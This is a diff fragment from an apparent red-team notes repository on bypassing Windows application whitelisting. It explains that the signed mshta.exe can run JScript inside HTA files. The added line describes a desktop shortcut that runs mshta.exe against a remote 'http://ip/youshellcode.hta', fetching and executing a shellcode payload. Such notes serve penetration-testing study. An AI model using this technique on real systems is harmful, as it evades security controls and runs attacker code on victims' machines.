@@ -90,3 +90,4 @@ C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe 
 Microsoft HTML Applications (MSHTA) excute .hta files with native mshta.exe. Since mshta.exe is located in C:\Windows\System32 and is a signed Microsoft application, it is
 commonly whitelisted. We can execute our Jscript code with mshta.exe instead of wscript.exe to bypass application whitelisting. This is an [example Jscript code](/06ApplicationWhitelistingBypass/hiddentJscript.hta) embedded inside of HTA file.
 
+We can create a short-cut to execute our hta script too. In user Desktop -> New -> Shorcut -> ```C:\Windows\System32\mshta.exe http://ip/youshellcode.hta```
